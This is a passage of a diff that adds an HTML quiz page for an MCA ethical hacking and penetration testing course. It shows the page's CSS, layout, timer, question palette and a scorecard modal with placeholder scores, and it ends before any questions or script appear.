@@ -1,0 +1,1763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ethical Hacking & Penetration Testing — Master Quiz Bank (160 MCQs)</title>
+  <meta name="description" content="Official 160-Question Interactive Examination for Ethical Hacking & Penetration Testing (MCA Semester III, LJ University). Covers Units 1-5, IT Act 2000, Nmap, Metasploit, Burp Suite, DVWA, and VAPT Reporting.">
+  <style>
+    :root {
+      --bg-primary: #0a0e17;
+      --bg-secondary: #111827;
+      --bg-card: #162032;
+      --bg-card-hover: #1e293b;
+      --border-color: rgba(255, 255, 255, 0.08);
+      --border-focus: #3b82f6;
+      --text-primary: #f8fafc;
+      --text-secondary: #94a3b8;
+      --text-muted: #64748b;
+      --accent-blue: #3b82f6;
+      --accent-cyan: #06b6d4;
+      --accent-indigo: #6366f1;
+      --accent-purple: #8b5cf6;
+      --color-success: #10b981;
+      --color-success-bg: rgba(16, 185, 129, 0.12);
+      --color-error: #ef4444;
+      --color-error-bg: rgba(239, 68, 68, 0.12);
+      --color-warning: #f59e0b;
+      --color-warning-bg: rgba(245, 158, 11, 0.12);
+      --radius-sm: 6px;
+      --radius-md: 10px;
+      --radius-lg: 16px;
+      --radius-full: 9999px;
+      --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.3);
+      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.4);
+      --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.5);
+      --transition-fast: 0.15s ease;
+      --transition-normal: 0.25s ease;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* Header Bar */
+    header {
+      background-color: var(--bg-secondary);
+      border-bottom: 1px solid var(--border-color);
+      padding: 12px 24px;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      backdrop-filter: blur(8px);
+    }
+
+    .header-container {
+      max-width: 1440px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .brand-section {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .brand-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-indigo));
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 16px rgba(6, 182, 212, 0.35);
+    }
+
+    .brand-icon svg {
+      width: 22px;
+      height: 22px;
+      fill: #ffffff;
+    }
+
+    .brand-text h1 {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: var(--text-primary);
+      line-height: 1.2;
+    }
+
+    .brand-text p {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .header-controls {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .mode-switch {
+      display: flex;
+      background-color: var(--bg-primary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-full);
+      padding: 3px;
+    }
+
+    .mode-btn {
+      background: none;
+      border: none;
+      padding: 6px 14px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      cursor: pointer;
+      border-radius: var(--radius-full);
+      transition: var(--transition-fast);
+    }
+
+    .mode-btn.active {
+      background: linear-gradient(135deg, var(--accent-blue), var(--accent-indigo));
+      color: #ffffff;
+      box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4);
+    }
+
+    .timer-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(19, 27, 46, 0.8);
+      border: 1px solid var(--border-color);
+      padding: 6px 14px;
+      border-radius: var(--radius-md);
+      font-family: monospace;
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--accent-cyan);
+    }
+
+    .timer-badge svg {
+      width: 16px;
+      height: 16px;
+      fill: currentColor;
+    }
+
+    .timer-btn {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2px;
+      transition: color var(--transition-fast);
+    }
+
+    .timer-btn:hover {
+      color: var(--text-primary);
+    }
+
+    .btn-submit-exam {
+      background: linear-gradient(135deg, var(--color-success), #059669);
+      color: #ffffff;
+      border: none;
+      padding: 8px 18px;
+      border-radius: var(--radius-md);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: transform var(--transition-fast), box-shadow var(--transition-fast);
+    }
+
+    .btn-submit-exam:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4);
+    }
+
+    /* Main Container Layout */
+    .app-layout {
+      max-width: 1440px;
+      margin: 0 auto;
+      width: 100%;
+      flex: 1;
+      display: grid;
+      grid-template-columns: 1fr 340px;
+      gap: 24px;
+      padding: 24px;
+    }
+
+    @media (max-width: 1024px) {
+      .app-layout {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Progress Bar */
+    .progress-section {
+      grid-column: 1 / -1;
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 12px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .progress-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+    }
+
+    .progress-track {
+      flex: 1;
+      height: 8px;
+      background: var(--bg-primary);
+      border-radius: var(--radius-full);
+      overflow: hidden;
+      border: 1px solid var(--border-color);
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent-cyan), var(--accent-indigo));
+      border-radius: var(--radius-full);
+      transition: width var(--transition-normal);
+    }
+
+    /* Question View Card */
+    .question-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-lg);
+      padding: 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      box-shadow: var(--shadow-md);
+      position: relative;
+    }
+
+    .question-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 16px;
+    }
+
+    .question-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .q-number-badge {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: var(--text-primary);
+    }
+
+    .badge {
+      font-size: 0.72rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+    }
+
+    .badge-simple {
+      background: rgba(16, 185, 129, 0.15);
+      color: #34d399;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .badge-medium {
+      background: rgba(59, 130, 246, 0.15);
+      color: #60a5fa;
+      border: 1px solid rgba(59, 130, 246, 0.3);
+    }
+
+    .badge-hard {
+      background: rgba(239, 68, 68, 0.15);
+      color: #f87171;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    .badge-scenario {
+      background: rgba(245, 158, 11, 0.15);
+      color: #fbbf24;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+    }
+
+    .badge-unit {
+      background: rgba(99, 102, 241, 0.15);
+      color: #a5b4fc;
+      border: 1px solid rgba(99, 102, 241, 0.3);
+    }
+
+    .topic-tag {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .question-tools {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-tool {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      color: var(--text-secondary);
+      padding: 6px 12px;
+      border-radius: var(--radius-md);
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: var(--transition-fast);
+    }
+
+    .btn-tool:hover {
+      background: var(--bg-card-hover);
+      color: var(--text-primary);
+    }
+
+    .btn-tool.flagged {
+      background: var(--color-warning-bg);
+      color: var(--color-warning);
+      border-color: rgba(245, 158, 11, 0.4);
+    }
+
+    .btn-tool svg {
+      width: 14px;
+      height: 14px;
+      fill: currentColor;
+    }
+
+    .question-prompt {
+      font-size: 1.12rem;
+      font-weight: 500;
+      line-height: 1.6;
+      color: var(--text-primary);
+    }
+
+    .question-prompt code {
+      background: rgba(0, 0, 0, 0.35);
+      padding: 2px 6px;
+      border-radius: var(--radius-sm);
+      font-family: monospace;
+      color: var(--accent-cyan);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    /* Options List */
+    .options-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .option-card {
+      background: var(--bg-card);
+      border: 1.5px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      transition: all var(--transition-fast);
+      user-select: none;
+    }
+
+    .option-card:hover:not(.locked) {
+      background: var(--bg-card-hover);
+      border-color: rgba(255, 255, 255, 0.18);
+      transform: translateX(4px);
+    }
+
+    .option-card.selected {
+      background: rgba(59, 130, 246, 0.12);
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 14px rgba(59, 130, 246, 0.2);
+    }
+
+    .option-card.is-correct {
+      background: var(--color-success-bg) !important;
+      border-color: var(--color-success) !important;
+      box-shadow: 0 0 16px rgba(16, 185, 129, 0.3) !important;
+    }
+
+    .option-card.is-incorrect {
+      background: var(--color-error-bg) !important;
+      border-color: var(--color-error) !important;
+      box-shadow: 0 0 16px rgba(239, 68, 68, 0.3) !important;
+    }
+
+    .opt-letter {
+      width: 32px;
+      height: 32px;
+      border-radius: var(--radius-full);
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      flex-shrink: 0;
+      transition: all var(--transition-fast);
+    }
+
+    .option-card.selected .opt-letter {
+      background: var(--accent-blue);
+      color: #ffffff;
+      border-color: var(--accent-blue);
+    }
+
+    .option-card.is-correct .opt-letter {
+      background: var(--color-success);
+      color: #ffffff;
+      border-color: var(--color-success);
+    }
+
+    .option-card.is-incorrect .opt-letter {
+      background: var(--color-error);
+      color: #ffffff;
+      border-color: var(--color-error);
+    }
+
+    .opt-text {
+      font-size: 0.95rem;
+      color: var(--text-primary);
+      line-height: 1.45;
+      flex: 1;
+    }
+
+    .opt-text code {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 2px 5px;
+      border-radius: 4px;
+      font-family: monospace;
+      color: var(--accent-cyan);
+    }
+
+    /* Explanation Box */
+    .explanation-card {
+      background: rgba(16, 185, 129, 0.08);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      border-radius: var(--radius-md);
+      padding: 16px 20px;
+      display: none;
+      animation: fadeIn 0.25s ease-in-out;
+    }
+
+    .explanation-card.visible {
+      display: block;
+    }
+
+    .explanation-title {
+      font-size: 0.82rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--color-success);
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .explanation-body {
+      font-size: 0.92rem;
+      line-height: 1.55;
+      color: #e2e8f0;
+    }
+
+    /* Card Footer Navigation */
+    .question-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      border-top: 1px solid var(--border-color);
+      padding-top: 16px;
+      flex-wrap: wrap;
+    }
+
+    .footer-left {
+      display: flex;
+      gap: 10px;
+    }
+
+    .footer-right {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn-nav {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      color: var(--text-primary);
+      padding: 10px 20px;
+      border-radius: var(--radius-md);
+      font-size: 0.88rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: var(--transition-fast);
+    }
+
+    .btn-nav:hover:not(:disabled) {
+      background: var(--bg-card-hover);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    .btn-nav:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+
+    .btn-nav.primary {
+      background: linear-gradient(135deg, var(--accent-blue), var(--accent-indigo));
+      border: none;
+      color: #ffffff;
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35);
+    }
+
+    .btn-nav.primary:hover:not(:disabled) {
+      box-shadow: 0 6px 16px rgba(59, 130, 246, 0.5);
+      transform: translateY(-1px);
+    }
+
+    /* Question Palette Sidebar */
+    .palette-sidebar {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-lg);
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      height: fit-content;
+      max-height: calc(100vh - 120px);
+      position: sticky;
+      top: 90px;
+    }
+
+    .palette-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .palette-header h2 {
+      font-size: 1rem;
+      font-weight: 700;
+    }
+
+    .palette-filter-select {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      color: var(--text-primary);
+      padding: 6px 10px;
+      border-radius: var(--radius-sm);
+      font-size: 0.8rem;
+      outline: none;
+      width: 100%;
+    }
+
+    .palette-legend {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 12px;
+    }
+
+    .legend-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .legend-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 3px;
+    }
+
+    .legend-dot.unanswered { background: #334155; }
+    .legend-dot.answered { background: var(--accent-blue); }
+    .legend-dot.flagged { background: var(--color-warning); }
+    .legend-dot.current { border: 2px solid var(--accent-cyan); background: transparent; }
+
+    .palette-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 6px;
+      overflow-y: auto;
+      padding-right: 4px;
+      max-height: 400px;
+    }
+
+    .palette-btn {
+      aspect-ratio: 1;
+      border-radius: var(--radius-sm);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: #1e293b;
+      color: var(--text-secondary);
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: var(--transition-fast);
+      position: relative;
+    }
+
+    .palette-btn:hover {
+      background: #334155;
+      color: var(--text-primary);
+    }
+
+    .palette-btn.answered {
+      background: rgba(59, 130, 246, 0.35);
+      border-color: rgba(59, 130, 246, 0.6);
+      color: #93c5fd;
+    }
+
+    .palette-btn.flagged {
+      background: var(--color-warning-bg);
+      border-color: var(--color-warning);
+      color: var(--color-warning);
+    }
+
+    .palette-btn.flagged::after {
+      content: '';
+      position: absolute;
+      top: 3px;
+      right: 3px;
+      width: 5px;
+      height: 5px;
+      background: var(--color-warning);
+      border-radius: var(--radius-full);
+    }
+
+    .palette-btn.current {
+      outline: 2px solid var(--accent-cyan);
+      outline-offset: 1px;
+      font-weight: 800;
+      color: #ffffff;
+    }
+
+    .palette-btn.is-correct {
+      background: var(--color-success-bg);
+      border-color: var(--color-success);
+      color: #34d399;
+    }
+
+    .palette-btn.is-incorrect {
+      background: var(--color-error-bg);
+      border-color: var(--color-error);
+      color: #f87171;
+    }
+
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      padding: 20px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity var(--transition-normal);
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-lg);
+      max-width: 680px;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      padding: 32px;
+      box-shadow: var(--shadow-lg);
+      transform: scale(0.95);
+      transition: transform var(--transition-normal);
+    }
+
+    .modal-overlay.active .modal-card {
+      transform: scale(1);
+    }
+
+    .modal-header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .modal-header h3 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+
+    .modal-header p {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+
+    .score-banner {
+      background: linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(99, 102, 241, 0.15));
+      border: 1px solid rgba(99, 102, 241, 0.3);
+      border-radius: var(--radius-md);
+      padding: 24px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .score-number {
+      font-size: 3rem;
+      font-weight: 900;
+      color: var(--accent-cyan);
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+
+    .score-grade {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #ffffff;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .stat-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 12px;
+      text-align: center;
+    }
+
+    .stat-label {
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .stat-val {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: var(--text-primary);
+    }
+
+    .category-breakdown {
+      margin-bottom: 24px;
+    }
+
+    .category-breakdown h4 {
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-secondary);
+      margin-bottom: 12px;
+    }
+
+    .cat-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 12px;
+      background: var(--bg-card);
+      border-radius: var(--radius-sm);
+      margin-bottom: 6px;
+      font-size: 0.88rem;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-top: 24px;
+    }
+
+    /* Review View */
+    .review-view {
+      grid-column: 1 / -1;
+      display: none;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .review-view.active {
+      display: flex;
+    }
+
+    .review-header-bar {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .review-filters {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .review-filter-btn {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      color: var(--text-secondary);
+      padding: 6px 12px;
+      border-radius: var(--radius-full);
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .review-filter-btn.active {
+      background: var(--accent-blue);
+      color: #ffffff;
+      border-color: var(--accent-blue);
+    }
+
+    .review-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .review-item {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .review-item.status-correct {
+      border-left: 4px solid var(--color-success);
+    }
+
+    .review-item.status-incorrect {
+      border-left: 4px solid var(--color-error);
+    }
+
+    .review-item.status-unanswered {
+      border-left: 4px solid var(--text-muted);
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Print styles */
+    @media print {
+      header, .palette-sidebar, .question-footer, .progress-section {
+        display: none !important;
+      }
+      body, .question-card, .review-item {
+        background: #ffffff !important;
+        color: #000000 !important;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Navigation Header -->
+  <header>
+    <div class="header-container">
+      <div class="brand-section">
+        <div class="brand-icon">
+          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+        </div>
+        <div class="brand-text">
+          <h1>Ethical Hacking & Penetration Testing</h1>
+          <p>Official Master Question Bank & Interactive Exam — 160 Questions</p>
+        </div>
+      </div>
+
+      <div class="header-controls">
+        <div class="mode-switch">
+          <button id="btnModePractice" class="mode-btn active" onclick="setMode('practice')">Practice Mode</button>
+          <button id="btnModeExam" class="mode-btn" onclick="setMode('exam')">Exam Mode</button>
+        </div>
+
+        <div class="timer-badge">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.2 3.2.8-1.3-4.5-2.7V7z"/></svg>
+          <span id="timerDisplay">00:00:00</span>
+          <button id="btnTimerToggle" class="timer-btn" title="Pause/Resume Timer" onclick="toggleTimer()">
+            <svg id="timerIconPause" viewBox="0 0 24 24" style="width:14px;height:14px;fill:currentColor;"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+          </button>
+        </div>
+
+        <button class="btn-submit-exam" onclick="confirmSubmitExam()">
+          <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+          Finish Test
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Progress Bar Bar -->
+  <div class="progress-section" style="max-width: 1440px; margin: 16px auto 0; width: calc(100% - 48px);">
+    <div class="progress-info">
+      <span>Progress: <strong id="progressAnswered">0</strong> / 160 Answered</span>
+      <span>•</span>
+      <span id="progressPercent">0%</span>
+    </div>
+    <div class="progress-track">
+      <div id="progressBarFill" class="progress-fill"></div>
+    </div>
+  </div>
+
+  <!-- App Main Content Area -->
+  <main class="app-layout">
+    
+    <!-- Left: Question Area -->
+    <div id="quizContainer" style="display: flex; flex-direction: column; gap: 20px;">
+      
+      <div class="question-card">
+        <div class="question-header">
+          <div class="question-meta">
+            <span id="qNumberText" class="q-number-badge">Question 1 of 160</span>
+            <span id="qDiffBadge" class="badge badge-simple">Simple</span>
+            <span id="qUnitBadge" class="badge badge-unit">Unit I</span>
+            <span id="qTopicText" class="topic-tag">Topic Name</span>
+          </div>
+          
+          <div class="question-tools">
+            <button id="btnFlagQuestion" class="btn-tool" onclick="toggleFlagCurrentQuestion()">
+              <svg viewBox="0 0 24 24"><path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z"/></svg>
+              <span id="flagText">Mark for Review</span>
+            </button>
+            <button class="btn-tool" onclick="clearCurrentSelection()">
+              <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              Clear
+            </button>
+          </div>
+        </div>
+
+        <div id="qPromptText" class="question-prompt">
+          Question text will be rendered here.
+        </div>
+
+        <!-- 4 Options (A, B, C, D) -->
+        <div id="optionsContainer" class="options-grid">
+          <!-- Dynamically populated -->
+        </div>
+
+        <!-- Immediate Explanation (Practice Mode or Post-Answer) -->
+        <div id="explanationContainer" class="explanation-card">
+          <div class="explanation-title">
+            <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            Explanation & Official Course Reference
+          </div>
+          <div id="explanationText" class="explanation-body">
+            Explanation will be displayed here.
+          </div>
+        </div>
+
+        <!-- Footer Navigation -->
+        <div class="question-footer">
+          <div class="footer-left">
+            <button id="btnPrev" class="btn-nav" onclick="prevQuestion()">
+              <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+              Previous
+            </button>
+          </div>
+          <div class="footer-right">
+            <button id="btnNext" class="btn-nav primary" onclick="nextQuestion()">
+              Next
+              <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Right: Question Palette Sidebar -->
+    <aside id="paletteSidebar" class="palette-sidebar">
+      <div class="palette-header">
+        <h2>Question Palette</h2>
+        <span id="paletteCountText" style="font-size:0.8rem; color:var(--text-muted);">160 Questions</span>
+      </div>
+
+      <select id="paletteFilterSelect" class="palette-filter-select" onchange="filterPalette(this.value)">
+        <option value="all">Show All Questions (160)</option>
+        <option value="unanswered">Unanswered Only</option>
+        <option value="answered">Answered Only</option>
+        <option value="flagged">Marked for Review Only</option>
+        <option value="Simple">Difficulty: Simple (35)</option>
+        <option value="Medium">Difficulty: Medium (35)</option>
+        <option value="Hard">Difficulty: Hard (30)</option>
+        <option value="Scenario">Difficulty: Scenario-Based (60)</option>
+        <option value="Unit I">Unit I: Fundamentals & Law</option>
+        <option value="Unit II">Unit II: Recon & Scanning</option>
+        <option value="Unit III">Unit III: Metasploit & PrivEsc</option>
+        <option value="Unit IV">Unit IV: Web App Pentesting</option>
+        <option value="Unit V">Unit V: Reporting & VAPT</option>
+      </select>
+
+      <div class="palette-legend">
+        <div class="legend-item"><div class="legend-dot unanswered"></div> Unanswered</div>
+        <div class="legend-item"><div class="legend-dot answered"></div> Answered</div>
+        <div class="legend-item"><div class="legend-dot flagged"></div> Marked</div>
+        <div class="legend-item"><div class="legend-dot current"></div> Current</div>
+      </div>
+
+      <div id="paletteGrid" class="palette-grid">
+        <!-- 160 grid buttons generated by JS -->
+      </div>
+    </aside>
+
+    <!-- Review View (Swapped into main area after submission) -->
+    <section id="reviewView" class="review-view">
+      <div class="review-header-bar">
+        <div>
+          <h2>Full Examination Review & Rationales</h2>
+          <p style="color:var(--text-muted); font-size:0.85rem;">Review all questions with correct answers, your choices, and source explanations.</p>
+        </div>
+        <div class="review-filters">
+          <button class="review-filter-btn active" onclick="filterReview('all', this)">All (160)</button>
+          <button class="review-filter-btn" onclick="filterReview('incorrect', this)">Incorrect Only</button>
+          <button class="review-filter-btn" onclick="filterReview('correct', this)">Correct Only</button>
+          <button class="review-filter-btn" onclick="filterReview('flagged', this)">Marked Only</button>
+          <button class="btn-nav" style="padding:6px 14px; font-size:0.8rem;" onclick="returnToTest()">Back to Test</button>
+        </div>
+      </div>
+
+      <div id="reviewListContainer" class="review-list">
+        <!-- Dynamically rendered review items -->
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Scorecard Result Modal -->
+  <div id="scoreModal" class="modal-overlay">
+    <div class="modal-card">
+      <div class="modal-header">
+        <h3>Examination Performance Scorecard</h3>
+        <p>Ethical Hacking & Penetration Testing — MCA Assessment</p>
+      </div>
+
+      <div class="score-banner">
+        <div id="modalScoreText" class="score-number">142 / 160</div>
+        <div id="modalPercentageText" style="font-size:1.25rem; font-weight:700; color:#38bdf8; margin-bottom:4px;">88.8% Accuracy</div>
+        <div id="modalGradeText" class="score-grade">Distinction / Master Pentester</div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-label">Attempted</div>
+          <div id="statAttempted" class="stat-val">160</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Correct</div>
+          <div id="statCorrect" class="stat-val" style="color:var(--color-success);">142</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Incorrect</div>
+          <div id="statIncorrect" class="stat-val" style="color:var(--color-error);">18</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Time Spent</div>
+          <div id="statTimeSpent" class="stat-val">42m 15s</div>
+        </div>
+      </div>
+
+      <div class="category-breakdown">
+        <h4>Performance by Difficulty Tier</h4>
+        <div class="cat-row">
+          <span>Simple (Fundamental Concepts)</span>
+          <strong id="catSimpleScore">32 / 35</strong>
+        </div>
+        <div class="cat-row">
+          <span>Medium (Comparisons & Concepts)</span>
+          <strong id="catMediumScore">31 / 35</strong>
+        </div>
+        <div class="cat-row">
+          <span>Hard (Technical & Analysis)</span>
+          <strong id="catHardScore">26 / 30</strong>
+        </div>
+        <div class="cat-row">
+          <span>Scenario-Based (Practical Application)</span>
+          <strong id="catScenarioScore">53 / 60</strong>
+        </div>
+      </div>
+
+      <div class="category-breakdown">
+        <h4>Performance by Syllabus Unit</h4>
+        <div class="cat-row">
+          <span>Unit I: Fundamentals, Legal & Ethics</span>
+          <strong id="unit1Score">-</strong>
+        </div>
+        <div class="cat-row">
+          <span>Unit II: Reconnaissance & Scanning</span>
